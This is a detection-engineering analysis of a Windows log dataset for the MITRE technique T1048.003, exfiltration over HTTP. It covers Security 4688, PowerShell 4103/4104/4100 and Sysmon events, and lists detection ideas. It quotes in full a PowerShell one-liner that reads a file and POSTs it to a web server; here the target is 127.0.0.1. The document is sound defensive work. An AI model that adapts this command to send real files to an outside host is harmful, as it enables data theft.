# T1048.003-4: Exfiltration Over Unencrypted Non-C2 Protocol — Exfiltration Over Alternative Protocol - HTTP

## Technique Context

T1048.003 represents exfiltration over unencrypted non-C2 protocols, specifically focusing on HTTP-based data exfiltration. This technique is commonly used by attackers to steal sensitive data by leveraging legitimate protocols that blend with normal network traffic. HTTP exfiltration is particularly attractive because it typically traverses firewalls without issue and appears as standard web traffic.

The detection community focuses on identifying unusual outbound HTTP traffic patterns, large data uploads to unexpected destinations, and the use of PowerShell cmdlets like `Invoke-WebRequest` or `Invoke-RestMethod` for data transmission. Key indicators include binary data in HTTP request bodies, connections to suspicious domains, and processes reading sensitive files before making HTTP requests.

## What This Dataset Contains

This dataset captures a PowerShell-based HTTP exfiltration attempt that reads a binary file and attempts to POST it to a local HTTP server. The primary evidence includes:

**Process Creation Chain**: Security event 4688 shows the creation of `powershell.exe` with command line `"powershell.exe" & {$content = Get-Content C:\Windows\System32\notepad.exe; Invoke-WebRequest -Uri http://127.0.0.1 -Method POST -Body $content}`, clearly indicating the exfiltration intent.

**PowerShell Script Execution**: Multiple PowerShell events capture the technique execution:
- Event 4104 shows the script block `{$content = Get-Content C:\Windows\System32\notepad.exe; Invoke-WebRequest -Uri http://127.0.0.1 -Method POST -Body $content}`
- Event 4103 captures `Get-Content` cmdlet invocation with parameter `Path=C:\Windows\System32\notepad.exe`
- Event 4103 shows `Invoke-WebRequest` with parameters `Uri=http://127.0.0.1/`, `Method=Post`, and `Body=MZ` (indicating PE file content)

**Connection Failure**: PowerShell event 4100 records the failure: "Error Message = Unable to connect to the remote server" with "Fully Qualified Error ID = System.Net.WebException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand", indicating the HTTP server was not reachable.

**Sysmon Evidence**: 
- Process creation (EID 1) for both PowerShell instances with full command lines
- Image loads (EID 7) showing urlmon.dll loading, indicating HTTP functionality preparation
- Process access (EID 10) showing inter-process communication during execution

## What This Dataset Does Not Contain

The dataset lacks actual network traffic because the HTTP connection failed (no server listening on 127.0.0.1). This means we don't see:
- Sysmon NetworkConnect events (EID 3) that would show the attempted outbound connection
- DNS resolution attempts if a domain name were used
- Successful HTTP POST request with the exfiltrated data
- Network-level evidence of data transmission size or timing

The technique doesn't generate registry modifications or additional file operations beyond the PowerShell profile data files, which are normal PowerShell artifacts.

## Assessment

This dataset provides excellent visibility into PowerShell-based HTTP exfiltration attempts from multiple complementary sources. The Security channel captures complete command lines showing the attacker's intent, PowerShell operational logs provide detailed cmdlet execution with parameters, and Sysmon adds process relationship context and DLL loading patterns.

The combination of Security 4688 command-line auditing and PowerShell script block logging (4104) creates a comprehensive picture of the technique execution, even when the network component fails. However, the lack of successful network transmission limits its utility for testing network-based detections.

For detection engineering, this represents a "preparation phase" dataset where the malicious intent and file access are clearly visible, but the actual exfiltration network activity is absent due to the connection failure.

## Detection Opportunities Present in This Data

1. **PowerShell HTTP Exfiltration Pattern**: Alert on PowerShell processes executing `Invoke-WebRequest` with POST method and file content as body, especially when reading system files or executables.

2. **Suspicious File Read Before Network Activity**: Detect `Get-Content` cmdlet reading binary files (PE headers like "MZ") followed by web request cmdlets in the same PowerShell session.

3. **Command Line Analysis**: Monitor Security 4688 events for PowerShell command lines containing both file reading operations and HTTP POST requests, particularly targeting system directories.

4. **PowerShell Script Block Correlation**: Use PowerShell 4104 events to identify script blocks that combine file access with network transmission cmdlets, focusing on sequences within the same ScriptBlock ID or session.

5. **Process Chain Analysis**: Alert on PowerShell parent-child relationships where child processes execute web request operations, using Sysmon ProcessCreate events and Security audit logs.

6. **Binary Data in HTTP Requests**: When network monitoring is available, detect HTTP requests with binary content (PE headers, compressed data) in POST bodies to unusual destinations.

7. **Failed Exfiltration Attempts**: Monitor PowerShell error events (4100) for network connection failures during web request operations, which may indicate blocked exfiltration attempts or misconfigured C2 infrastructure.
